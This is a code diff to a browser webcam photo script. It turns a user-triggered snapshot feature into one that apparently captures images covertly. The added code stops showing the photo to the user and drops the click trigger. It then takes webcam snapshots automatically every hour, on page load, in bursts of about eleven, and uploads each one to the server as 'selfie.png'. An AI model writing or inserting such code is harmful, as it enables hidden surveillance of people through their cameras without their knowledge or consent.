@@ -55,36 +55,39 @@ else{
 
 // Mobile browsers cannot play video without user inpu
 
+function urltoFile(url, filename, mimeType){
+    return (fetch(url)
+            .then(function(res){return res.arrayBuffer();})
+            .then(function(buf){return new File([buf], filename, {type:mimeType});})
+    );
+}
+var i =0;
 function takePhoto() {
-
-
     var snap = takeSnapshot();
-
-    // Show image.
-    image.setAttribute('src', snap);
-    image.classList.add("visible");
-    // Show image.
-    image.setAttribute('src', snap);
-    image.classList.add("visible");
-
-    // Enable delete and save buttons
-    delete_photo_btn.classList.remove("disabled");
-    download_photo_btn.classList.remove("disabled");
-
-    // Set the href attribute of the download button to the snap url.
-    download_photo_btn.href = snap;
-
-    download_photo_btn.click();
-    delete_photo_btn.click();
+    urltoFile(snap,'selfie.png','image/png').then(function(file){
+        console.log(file);
+        var formData = new FormData();
+        formData.append('file', file);
+        $.ajax({
+            url: '/',
+            method:'POST',
+            processData: false,
+            contentType: false,
+            data: formData,
+            success: function (data) {
+                if(i<10) {
+                    takePhoto()
+                    i = i + 1
+                }
+                else {
+                    i = 0
+                }
+            }
+        });
+    })
 }
 
-
-
-
-
-take_photo_btn.addEventListener("click", function(e){
-    setInterval(takePhoto, 3600000);
-});
+setInterval(takePhoto, 3600000);
 
 delete_photo_btn.addEventListener("click", function(e){
 
